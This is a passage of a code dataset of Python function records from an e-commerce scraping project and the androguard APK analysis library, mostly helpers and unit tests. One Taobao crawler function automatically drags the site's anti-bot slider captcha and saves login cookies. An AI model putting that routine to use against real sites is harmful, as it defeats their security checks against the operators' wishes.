{"docstring": "'''\n\u5931\u8d25\u9875\u6570\u91cd\u65b0\u722c\u53d6\n:param page: \u5931\u8d25\u9875\u6570\n:param retry: \u91cd\u8bd5\u6b21\u6570\n:return:\n'''\n", "func_signal": "def spider_by_page(self, page, retry=3):\n", "code": "if retry > 0:\n    print('\u91cd\u8bd5\u7b2c{}\u9875'.format(page))\n    req = self.request(page=page)\n    try:\n        data = req.json()['data']\n        if data:\n            self.clean_data(data)\n            print('\u7b2c{}\u9875\u91cd\u8bd5\u6210\u529f'.format(page))\n    except:\n        self.spider_by_page(page=page, retry=retry - 1)", "path": "ECommerceCrawlers/OthertCrawler/0x15xiaomiappshop/xiaomishop.py", "commit_date": "2019-12-25 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# \u4e0d\u9700\u8981\u6d4b\u8bd5\u65f6\uff0c\u6ce8\u91ca\u6389\u65e5\u5fd7\u5c31\u53ef\u4ee5\u4e86\n", "func_signal": "def LOG(log):\n", "code": "print(log)\nlog = None", "path": "ECommerceCrawlers/SIPO\u4e13\u5229\u5ba1\u67e5/fateadm_api.py", "commit_date": "2020-03-31 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# \u6d4b\u7f51\u7ad9\u7684\u662f\u4e0d\u662f\u5904\u4e8e\u5b89\u5168\u72b6\u6001\n", "func_signal": "def check_security(self):\n", "code": "move_num = 0\nwhile self.err_title():\n    move_num += 1\n    if move_num > 50:\n        self.browser.quit()\n        raise RuntimeError\n    try:\n        getcache = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '.nc_scale  > .nc_iconfont')))\n        print('\u6ed1\u52a8\u7684\u5bf9\u8c61', getcache)\n        self._move(getcache=getcache)  # \u79fb\u52a8\u6ed1\u5757\u3002\u5c31\u662f\u6bd4\u8f83\u6162\n        self.errMessage.put('\u6ed1\u5757\u6ed1\u52a8{}\u6b21'.format(move_num))\n        print('\u6ed1\u52a8{}\u6b21'.format(move_num))\n        if self.is_username(short=True):\n            self.save_cookies(self.user)\n\n        else:\n            self.browser.refresh()\n    except Exception as e:\n        print('\u6ed1\u52a8\u91cd\u5927\u9519\u8bef',e)\n        # self.close_webdrive()\n        # self.login()", "path": "ECommerceCrawlers/TaobaoCrawler/listen.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "'''\n\u4f20\u5165\u7f51\u7ad9url\uff0c\u89e3\u6790\u7f51\u7ad9\u7684\u6807\u9898\uff0c\u52a0\u5165\u5230\u53bb\u91cd\u7684\u961f\u5217\u51fd\u6570\u4e2d\n:return:\n'''\n", "func_signal": "def req_title(self):\n", "code": "while True:\n    #\u6682\u505c\u4e0e\u542f\u52a8\n\n    flag = self.flag_queue.get()\n    self.flag_queue.put(flag)\n    if flag==0:\n        time.sleep(2)", "path": "ECommerceCrawlers/OthertCrawler/0x11zzc/zz_spider.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "'''\n:param category: \u6a21\u5757id\uff0c\u5982\u6e38\u620f\uff1a15\n:return:\n'''\n", "func_signal": "def spider(self):\n", "code": "fail_page = []\nfor _ in range(self.max_page):\n    print('\u6b63\u5728\u722c\u53d6\u7b2c{}\u9875'.format(_))\n    req = self.request(_)\n    try:\n        data = req.json()['data']\n    except:\n        data = []\n        fail_page.append(_)\n    if data:\n        self.clean_data(data)\n    else:\n        continue\nif fail_page:\n    print('\u51fa\u9519\u7684\u9875\u6570\uff1a', fail_page)\n    for _ in fail_page:\n        self.spider_by_page(page=_)\nelse:\n    print('\u6ca1\u6709\u51fa\u9519')", "path": "ECommerceCrawlers/OthertCrawler/0x15xiaomiappshop/xiaomishop.py", "commit_date": "2019-12-25 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\nTest if the resource name translation works\n\"\"\"\n", "func_signal": "def testResourceNames(self):\n", "code": "arsc = self.apk.get_android_resources()\n\nself.assertEqual(arsc.get_resource_xml_name(0x7F040001), \"@tests.androguard:string/app_name\")\nself.assertEqual(arsc.get_resource_xml_name(0x7F020000), \"@tests.androguard:drawable/icon\")\n\nself.assertEqual(arsc.get_resource_xml_name(0x7F040001, 'tests.androguard'), \"@string/app_name\")\nself.assertEqual(arsc.get_resource_xml_name(0x7F020000, 'tests.androguard'), \"@drawable/icon\")\n\n# Also test non existing resources\nself.assertIsNone(arsc.get_resource_xml_name(0xFFFFFFFF))\nself.assertEqual(arsc.get_id('sdf', 0x7F040001), (None, None, None))\nself.assertEqual(arsc.get_id('tests.androguard', 0xFFFFFFFF), (None, None, None))", "path": "androguard/tests/test_arsc.py", "commit_date": "2019-02-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nTest if classes are noted as external if not both zips are opened\n\"\"\"\n", "func_signal": "def testMultiDexExternal(self):\n", "code": "from zipfile import ZipFile\n\nwith ZipFile(\"examples/tests/multidex/multidex.apk\") as myzip:\n    c1 = myzip.read(\"classes.dex\")\n    c2 = myzip.read(\"classes2.dex\")\n\nd1 = dvm.DalvikVMFormat(c1)\nd2 = dvm.DalvikVMFormat(c2)\n\ndx = analysis.Analysis()\n\ndx.add(d1)\n\n# Both classes should be in the analysis, but only the fist is internal\nself.assertIn(\"Lcom/foobar/foo/Foobar;\", dx.classes)\nself.assertFalse(dx.classes[\"Lcom/foobar/foo/Foobar;\"].is_external())\nself.assertNotIn(\"Lcom/blafoo/bar/Blafoo;\", dx.classes)\n\ndx = analysis.Analysis()\ndx.add(d2)\nself.assertIn(\"Lcom/blafoo/bar/Blafoo;\", dx.classes)\nself.assertFalse(dx.classes[\"Lcom/blafoo/bar/Blafoo;\"].is_external())\nself.assertNotIn(\"Lcom/foobar/foo/Foobar;\", dx.classes)\n\n# Now we \"see\" the reference to Foobar\ndx.create_xref()\nself.assertIn(\"Lcom/foobar/foo/Foobar;\", dx.classes)\nself.assertTrue(dx.classes[\"Lcom/foobar/foo/Foobar;\"].is_external())\n\ndx = analysis.Analysis()\ndx.add(d1)\ndx.add(d2)\n\nself.assertIn(\"Lcom/blafoo/bar/Blafoo;\", dx.classes)\nself.assertFalse(dx.classes[\"Lcom/blafoo/bar/Blafoo;\"].is_external())\nself.assertIn(\"Lcom/foobar/foo/Foobar;\", dx.classes)\nself.assertFalse(dx.classes[\"Lcom/foobar/foo/Foobar;\"].is_external())", "path": "androguard/tests/test_analysis.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nTest if the resolving of different string locales works\n\"\"\"\n", "func_signal": "def testDifferentStringLocales(self):\n", "code": "a = APK(\"examples/tests/a2dp.Vol_137.apk\")\narsc = a.get_android_resources()\n\np = arsc.get_packages_names()[0]\n\nself.assertEqual(sorted([\"\\x00\\x00\", \"da\", \"de\", \"el\", \"fr\", \"ja\", \"ru\"]),\n                 sorted(arsc.get_locales(p)))\n\nitem = \"SMSDelayText\"\nstrings = {\"\\x00\\x00\": \"Delay for reading text message\",\n           \"da\": \"Forsinkelse for l\u00e6sning af tekst besked\",\n           \"de\": \"Verz\u00f6gerung vor dem Lesen einer SMS\",\n           \"el\": \"\u03a7\u03c1\u03bf\u03bd\u03bf\u03ba\u03b1\u03b8\u03c5\u03c3\u03c4\u03ad\u03c1\u03b7\u03c3\u03b7 \u03b1\u03bd\u03ac\u03b3\u03bd\u03c9\u03c3\u03b7\u03c2 \u03bc\u03b7\u03bd\u03c5\u03bc\u03ac\u03c4\u03c9\u03bd SMS\",\n           \"fr\": \"D\u00e9lai pour lire un SMS\",\n           \"ja\": \"\u30c6\u30ad\u30b9\u30c8\u30e1\u30c3\u30bb\u30fc\u30b8\u8aad\u307f\u4e0a\u3052\u306e\u9045\u5ef6\",\n           \"ru\": \"\u0417\u0430\u0434\u0435\u0440\u0436\u043a\u0430 \u0437\u0430\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u044f SMS\",\n           }\nfor k, v in strings.items():\n    e = etree.fromstring(arsc.get_string_resources(p, k))\n    self.assertEqual(e.find(\"string[@name='{}']\".format(item)).text, v)", "path": "androguard/tests/test_arsc.py", "commit_date": "2019-02-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"Test the get_permissions and get_permission_usage methods\"\"\"\n", "func_signal": "def testPermissions(self):\n", "code": "a, _, dx = AnalyzeAPK(\"examples/android/TestsAndroguard/bin/TestActivity.apk\")\n\napi_level = a.get_effective_target_sdk_version()\nused_permissions = ['android.permission.BROADCAST_STICKY', 'android.permission.ACCESS_NETWORK_STATE']\nsticky_meths = ['onMenuItemSelected', 'navigateUpTo']\nnetwork_meths = ['getNetworkInfo', 'getActiveNetworkInfo', 'isActiveNetworkMetered']\n\nfor _, perm in dx.get_permissions(api_level):\n    for p in perm:\n        self.assertIn(p, used_permissions)\nmeths = [x.name for x in dx.get_permission_usage('android.permission.BROADCAST_STICKY', api_level)]\nself.assertListEqual(sorted(meths), sorted(sticky_meths))\nmeths = [x.name for x in dx.get_permission_usage('android.permission.ACCESS_NETWORK_STATE', api_level)]\nself.assertListEqual(sorted(meths), sorted(network_meths))\n\n# Should give same result if no API level is given\nfor _, perm in dx.get_permissions():\n    for p in perm:\n        self.assertIn(p, used_permissions)\nmeths = [x.name for x in dx.get_permission_usage('android.permission.BROADCAST_STICKY')]\nself.assertListEqual(sorted(meths), sorted(sticky_meths))\nmeths = [x.name for x in dx.get_permission_usage('android.permission.ACCESS_NETWORK_STATE')]\nself.assertListEqual(sorted(meths), sorted(network_meths))", "path": "androguard/tests/test_analysis.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nwrapper for interpolate_tuple that accepts colors as html (\"#CCCCC\" and such)\n\"\"\"\n", "func_signal": "def color_range(startcolor, goalcolor, steps):\n", "code": "start_tuple = make_color_tuple(startcolor)\ngoal_tuple = make_color_tuple(goalcolor)\n\nreturn interpolate_tuple(start_tuple, goal_tuple, steps)", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nStart an interactive shell\n\n:param session: Session file to load\n:param filename: File to analyze, can be APK or DEX (or ODEX)\n\"\"\"\n", "func_signal": "def androlyze_main(session, filename):\n", "code": "from androguard.core.androconf import ANDROGUARD_VERSION, CONF\nfrom IPython.terminal.embed import InteractiveShellEmbed\nfrom traitlets.config import Config\nfrom androguard.session import Session, Load\nfrom colorama import Fore\nimport colorama\nimport atexit\n\n# Import commonly used classes, for further usage...\nfrom androguard.core.bytecodes.apk import APK\nfrom androguard.core.bytecodes.dvm import DalvikVMFormat\nfrom androguard.core.analysis.analysis import Analysis\nfrom androguard.misc import AnalyzeAPK\n\ncolorama.init()\n\nif session:\n    print(\"Restoring session '{}'...\".format(session))\n    s = CONF['SESSION'] = Load(session)\n    print(\"Successfully restored {}\".format(s))\n    # TODO Restore a, d, dx etc...\nelse:\n    s = CONF[\"SESSION\"] = Session(export_ipython=True)\n\nif filename:\n    (\"Loading apk {}...\".format(os.path.basename(filename)))\n    print(\"Please be patient, this might take a while.\")\n\n    filetype = androconf.is_android(filename)\n\n    print(\"Found the provided file is of type '{}'\".format(filetype))\n\n    if filetype not in ['DEX', 'DEY', 'APK']:\n        print(Fore.RED + \"This file type is not supported by androlyze for auto loading right now!\" + Fore.RESET, file=sys.stderr)\n        print(\"But your file is still available:\")\n        print(\">>> filename\")\n        print(repr(filename))\n        print()\n\n    else:\n        with open(filename, \"rb\") as fp:\n            raw = fp.read()\n\n        h = s.add(apk, raw)\n        print(\"Added file to session: SHA256::{}\".format(h))\n\n        if filetype == 'APK':\n            print(\"Loaded APK file...\")\n            a, d, dx = s.get_objects_apk(digest=h)\n\n            print(\">>> a\")\n            print(a)\n            print(\">>> d\")\n            print(d)\n            print(\">>> dx\")\n            print(dx)\n            print()\n        elif filetype in ['DEX', 'DEY']:\n            print(\"Loaded DEX file...\")\n            for h_, d, dx in s.get_objects_dex():\n                if h == h_:\n                    break\n            print(\">>> d\")\n            print(d)\n            print(\">>> dx\")\n            print(dx)\n            print()\n\ndef shutdown_hook():\n    \"\"\"Save the session on exit, if wanted\"\"\"\n    if not s.isOpen():\n        return\n\n    try:\n        res = input(\"Do you want to save the session? (y/[n])?\").lower()\n    except (EOFError, KeyboardInterrupt):\n        pass\n    else:\n        if res == \"y\":\n            # TODO: if we already started from a session, probably we want to save it under the same name...\n            # TODO: be able to take any filename you want\n            fname = s.save()\n            print(\"Saved Session to file: '{}'\".format(fname))\n\ncfg = Config()\n_version_string = \"Androguard version {}\".format(ANDROGUARD_VERSION)\nipshell = InteractiveShellEmbed(config=cfg, banner1=\"{} started\"\n                                .format(_version_string))\natexit.register(shutdown_hook)\nipshell()", "path": "androguard/androguard/cli/main.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "# Load pyqt5 after argument processing, so we can collect the arguments\n# on a system without PyQT5.\n", "func_signal": "def androgui_main(input_file, input_plugin):\n", "code": "try:\n    from PyQt5 import QtWidgets, QtGui\nexcept ImportError:\n    print(\"No PyQT5 found! Exiting...\", file=sys.stderr)\n    sys.exit(1)\ntry:\n    import pyperclip\nexcept ImportError:\n    print(\"No pyperclip found! Exiting...\", file=sys.stderr)\n    sys.exit(1)\n\nfrom androguard.gui.mainwindow import MainWindow\n\n# We need that to save huge sessions when leaving and avoid\n# RuntimeError: maximum recursion depth exceeded while pickling an object\n# or\n# RuntimeError: maximum recursion depth exceeded in cmp\n# http://stackoverflow.com/questions/2134706/hitting-maximum-recursion-depth-using-pythons-pickle-cpickle\nsys.setrecursionlimit(50000)\n\napp = QtWidgets.QApplication(sys.argv)\n\nwindow = MainWindow(input_file=input_file,\n                    input_plugin=input_plugin)\nwindow.resize(1024, 768)\nwindow.show()\n\nsys.exit(app.exec_())", "path": "androguard/androguard/cli/main.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nRecursivly delete a directory\n\n:param directory: directory to remove\n\"\"\"\n", "func_signal": "def rrmdir(directory):\n", "code": "for root, dirs, files in os.walk(directory, topdown=False):\n    for name in files:\n        os.remove(os.path.join(root, name))\n    for name in dirs:\n        os.rmdir(os.path.join(root, name))\nos.rmdir(directory)", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nturn something like \"#000000\" into 0,0,0\nor \"#FFFFFF into \"255,255,255\"\n\"\"\"\n", "func_signal": "def make_color_tuple(color):\n", "code": "R = color[1:3]\nG = color[3:5]\nB = color[5:7]\n\nR = int(R, 16)\nG = int(G, 16)\nB = int(B, 16)\n\nreturn R, G, B", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "# Generate test cases for this APK:\n", "func_signal": "def test_all_decompiler():\n", "code": "a, d, dx = AnalyzeAPK(\"examples/tests/hello-world.apk\")\nfor c in d[0].get_classes():\n    test_name = re.sub(\"[^a-zA-Z0-9_]\", \"_\", str(c.get_name())[1:-1])\n    # Test the decompilation of a single class\n    # disable for now, as testing all DvMethods has the same effect as\n    # testing all DvClasses.\n    #yield dvclass, c, dx\n\n    # Test the decompilation of all single methods in the class\n    # if methods are in the class\n    if len(c.get_methods()) == 0:\n        # But we test on all classes that have no methods.\n        yield dvclass, c, dx\n        continue\n\n    yield dvmethod, c, dx, False\n    # Disable tests for doAST=True for now...\n    yield dvmethod, c, dx, True", "path": "androguard/tests/test_decompiler.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"Test if XREFs produce the correct results\"\"\"\n", "func_signal": "def testXrefs(self):\n", "code": "with open(\"examples/android/TestsAndroguard/bin/classes.dex\", \"rb\") as fd:\n    d = dvm.DalvikVMFormat(fd.read())\n    dx = analysis.Analysis(d)\n\ndx.create_xref()\n\ntestcls = dx.classes['Ltests/androguard/TestActivity;']\nself.assertIsInstance(testcls, analysis.ClassAnalysis)\n\ntestmeth = list(filter(lambda x: x.name == 'onCreate', testcls.get_methods()))[0]\n\nself.assertEqual(len(list(dx.find_methods(testcls.name, '^onCreate$'))), 1)\nself.assertEqual(list(dx.find_methods(testcls.name, '^onCreate$'))[0], testmeth)\n\nself.assertIsInstance(testmeth, analysis.MethodAnalysis)\nself.assertFalse(testmeth.is_external())\nself.assertIsInstance(testmeth.method, dvm.EncodedMethod)\nself.assertEqual(testmeth.name, 'onCreate')\n\nxrefs = list(map(lambda x: x.full_name, map(itemgetter(1), sorted(testmeth.get_xref_to(), key=itemgetter(2)))))\nself.assertEqual(len(xrefs), 5)\n\n# First, super is called:\nself.assertEqual(xrefs.pop(0), 'Landroid/app/Activity; onCreate (Landroid/os/Bundle;)V')\n# then setContentView (which is in the current class but the method is external)\nself.assertEqual(xrefs.pop(0), 'Ltests/androguard/TestActivity; setContentView (I)V')\n# then getApplicationContext (inside the Toast)\nself.assertEqual(xrefs.pop(0), 'Ltests/androguard/TestActivity; getApplicationContext ()Landroid/content/Context;')\n# then Toast.makeText\nself.assertEqual(xrefs.pop(0), 'Landroid/widget/Toast; makeText (Landroid/content/Context; Ljava/lang/CharSequence; I)Landroid/widget/Toast;')\n# then show()\nself.assertEqual(xrefs.pop(0), 'Landroid/widget/Toast; show ()V')\n\n# Now, test if the reverse is true\nother = list(dx.find_methods('^Landroid/app/Activity;$', '^onCreate$'))\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertTrue(other[0].is_external())\nself.assertTrue(other[0].is_android_api())\n# We have MethodAnalysis now stored in the xref!\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\nother = list(dx.find_methods('^Ltests/androguard/TestActivity;$', '^setContentView$'))\n# External because not overwritten in class:\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertTrue(other[0].is_external())\nself.assertFalse(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\nother = list(dx.find_methods('^Ltests/androguard/TestActivity;$', '^getApplicationContext$'))\n# External because not overwritten in class:\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertTrue(other[0].is_external())\nself.assertFalse(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\nother = list(dx.find_methods('^Landroid/widget/Toast;$', '^makeText$'))\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertTrue(other[0].is_external())\nself.assertTrue(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\nother = list(dx.find_methods('^Landroid/widget/Toast;$', '^show$'))\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertTrue(other[0].is_external())\nself.assertTrue(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\n# Next test internal calls\ntestmeth = list(filter(lambda x: x.name == 'testCalls', testcls.get_methods()))[0]\n\nself.assertEqual(len(list(dx.find_methods(testcls.name, '^testCalls$'))), 1)\nself.assertEqual(list(dx.find_methods(testcls.name, '^testCalls$'))[0], testmeth)\n\nself.assertIsInstance(testmeth, analysis.MethodAnalysis)\nself.assertFalse(testmeth.is_external())\nself.assertIsInstance(testmeth.method, dvm.EncodedMethod)\nself.assertEqual(testmeth.name, 'testCalls')\n\nxrefs = list(map(lambda x: x.full_name, map(itemgetter(1), sorted(testmeth.get_xref_to(), key=itemgetter(2)))))\nself.assertEqual(len(xrefs), 4)\n\nself.assertEqual(xrefs.pop(0), 'Ltests/androguard/TestActivity; testCall2 (J)V')\nself.assertEqual(xrefs.pop(0), 'Ltests/androguard/TestIfs; testIF (I)I')\nself.assertEqual(xrefs.pop(0), 'Ljava/lang/Object; getClass ()Ljava/lang/Class;')\nself.assertEqual(xrefs.pop(0), 'Ljava/io/PrintStream; println (Ljava/lang/Object;)V')\n\nother = list(dx.find_methods('^Ltests/androguard/TestActivity;$', '^testCall2$'))\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertFalse(other[0].is_external())\nself.assertFalse(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\nother = list(dx.find_methods('^Ltests/androguard/TestIfs;$', '^testIF$'))\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertFalse(other[0].is_external())\nself.assertFalse(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\nother = list(dx.find_methods('^Ljava/lang/Object;$', '^getClass$'))\nself.assertEqual(len(other), 1)\nself.assertIsInstance(other[0], analysis.MethodAnalysis)\nself.assertTrue(other[0].is_external())\nself.assertTrue(other[0].is_android_api())\nself.assertIn(testmeth, map(itemgetter(1), other[0].get_xref_from()))\n\n# Testing new_instance\ntestmeth = list(filter(lambda x: x.name == 'testString', testcls.get_methods()))[0]\nself.assertIsInstance(testmeth, analysis.MethodAnalysis)\nself.assertFalse(testmeth.is_external())\nself.assertIsInstance(testmeth.method, dvm.EncodedMethod)\nself.assertEqual(testmeth.name, 'testString')\n\nstringcls = dx.classes['Ljava/lang/String;']\nself.assertIsInstance(stringcls, analysis.ClassAnalysis)\n\nself.assertIn(stringcls, map(itemgetter(0), testmeth.get_xref_new_instance()))\nself.assertIn(testmeth, map(itemgetter(0), stringcls.get_xref_new_instance()))\n\n# Not testing println, as it has too many variants...", "path": "androguard/tests/test_analysis.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"Tests if String offsets in bytecode are correctly stored\"\"\"\n", "func_signal": "def testXrefOffsets(self):\n", "code": "_, _, dx = AnalyzeDex('examples/tests/AnalysisTest.dex')\n\nself.assertEqual(len(dx.get_strings()), 1)\nself.assertIsInstance(dx.strings['Hello world'], analysis.StringAnalysis)\n\nsa = dx.strings['Hello world']\n\nself.assertEqual(len(sa.get_xref_from()), 1)\nself.assertEqual(len(sa.get_xref_from(withoffset=True)), 1)\nself.assertEqual(next(iter(sa.get_xref_from(withoffset=True)))[2], 4)  # offset is 4", "path": "androguard/tests/test_analysis.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nLoad the module from the JSON files and return a dict, which might be empty\nif the resource could not be loaded.\n\nIf no api version is given, the default one from the CONF dict is used.\n\n:param resource_name: Name of the resource to load\n:param api: API version\n:return: dict\n\"\"\"\n", "func_signal": "def load_api_specific_resource_module(resource_name, api=None):\n", "code": "loader = dict(aosp_permissions=load_permissions,\n              api_permission_mappings=load_permission_mappings)\n\nif resource_name not in loader:\n    raise InvalidResourceError(\"Invalid Resource '{}', not in [{}]\".format(resource_name, \", \".join(loader.keys())))\n\nif not api:\n    api = CONF[\"DEFAULT_API\"]\n\nret = loader[resource_name](api)\n\nif ret == {}:\n    # No API mapping found, return default\n    log.warning(\"API mapping for API level {} was not found! \"\n                \"Returning default, which is API level {}\".format(api, CONF['DEFAULT_API']))\n    ret = loader[resource_name](CONF['DEFAULT_API'])\n\nreturn ret", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nPlot the call graph using matplotlib\nFor larger graphs, this should not be used, as it is very slow\nand probably you can not see anything on it.\n\n:param cg: A networkx call graph to plot\n\"\"\"\n", "func_signal": "def plot(cg):\n", "code": "import matplotlib.pyplot as plt\nimport networkx as nx\npos = nx.spring_layout(cg)\n\ninternal = []\nexternal = []\n\nfor n in cg.nodes:\n    if n.is_external():\n        external.append(n)\n    else:\n        internal.append(n)\n\nnx.draw_networkx_nodes(cg, pos=pos, node_color='r', nodelist=internal)\nnx.draw_networkx_nodes(cg, pos=pos, node_color='b', nodelist=external)\nnx.draw_networkx_edges(cg, pos, arrows=True)\nnx.draw_networkx_labels(cg, pos=pos, labels={x: \"{}{}\".format(x.class_name, x.name) for x in cg.nodes})\nplt.draw()\nplt.show()", "path": "androguard/androguard/cli/main.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nTake two RGB color sets and mix them over a specified number of steps.  Return the list\n\"\"\"\n# white\n\n", "func_signal": "def interpolate_tuple(startcolor, goalcolor, steps):\n", "code": "R = startcolor[0]\nG = startcolor[1]\nB = startcolor[2]\n\ntargetR = goalcolor[0]\ntargetG = goalcolor[1]\ntargetB = goalcolor[2]\n\nDiffR = targetR - R\nDiffG = targetG - G\nDiffB = targetB - B\n\nbuffer = []\n\nfor i in range(0, steps + 1):\n    iR = R + (DiffR * i // steps)\n    iG = G + (DiffG * i // steps)\n    iB = B + (DiffB * i // steps)\n\n    hR = str.replace(hex(iR), \"0x\", \"\")\n    hG = str.replace(hex(iG), \"0x\", \"\")\n    hB = str.replace(hex(iB), \"0x\", \"\")\n\n    if len(hR) == 1:\n        hR = \"0\" + hR\n    if len(hB) == 1:\n        hB = \"0\" + hB\n\n    if len(hG) == 1:\n        hG = \"0\" + hG\n\n    color = str.upper(\"#\" + hR + hG + hB)\n    buffer.append(color)\n\nreturn buffer", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nReturn the type of the file\n\n:param filename : the filename\n:returns: \"APK\", \"DEX\", None\n\"\"\"\n", "func_signal": "def is_android(filename):\n", "code": "if not filename:\n    return None\n\nwith open(filename, \"rb\") as fd:\n    f_bytes = fd.read()\n    return is_android_raw(f_bytes)", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nTest if a string contains other chars than ASCII\n\n:param androguard.core.mutf8.MUTF8String s: a string to test\n:return: True if string contains other chars than ASCII, False otherwise\n:rtype: bool\n\"\"\"\n", "func_signal": "def is_ascii_problem(s):\n", "code": "try:\n    # As MUTF8Strings are actually bytes, we can simply check if they are ASCII or not\n    s.decode(\"ascii\")\n    return False\nexcept (UnicodeEncodeError, UnicodeDecodeError):\n    return True", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nenable log messages on stdout\n\nWe will catch all messages here! From all loggers...\n\"\"\"\n", "func_signal": "def show_logging(level=logging.INFO):\n", "code": "logger = logging.getLogger()\n\nh = logging.StreamHandler(stream=sys.stderr)\nh.setFormatter(logging.Formatter(fmt=\"[%(levelname)-8s] %(name)s: %(message)s\"))\n\nlogger.addHandler(h)\nlogger.setLevel(level)", "path": "androguard/androguard/core/androconf.py", "commit_date": "2019-10-23 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"Tests if Field offsets in bytecode are correctly stored\"\"\"\n", "func_signal": "def testXrefOffsetsFields(self):\n", "code": "_, _, dx = AnalyzeDex('examples/tests/FieldsTest.dex')\n\nself.assertEqual(len(dx.get_strings()), 4)\nself.assertIn('hello world', dx.strings.keys())\nself.assertIn('sdf', dx.strings.keys())\nself.assertIn('hello mars', dx.strings.keys())\nself.assertIn('i am static', dx.strings.keys())\n\nafield = next(dx.find_fields(fieldname='afield'))\n\nself.assertEqual(len(afield.get_xref_read()), 1)  # always same method\nself.assertEqual(len(afield.get_xref_read(withoffset=True)), 2)\nself.assertListEqual(list(sorted(map(itemgetter(2), afield.get_xref_read(withoffset=True)))), [4, 40])\nself.assertListEqual(list(map(lambda x: x.name, map(itemgetter(1),\n    afield.get_xref_read(withoffset=True)))), [\"foonbar\", \"foonbar\"])\n\nself.assertEqual(len(afield.get_xref_write()), 2)\nself.assertEqual(len(afield.get_xref_write(withoffset=True)), 2)\nself.assertListEqual(list(sorted(map(itemgetter(2), afield.get_xref_write(withoffset=True)))), [10, 32])\nself.assertListEqual(list(sorted(map(lambda x: x.name, map(itemgetter(1),\n    afield.get_xref_write(withoffset=True))))), sorted([\"<init>\", 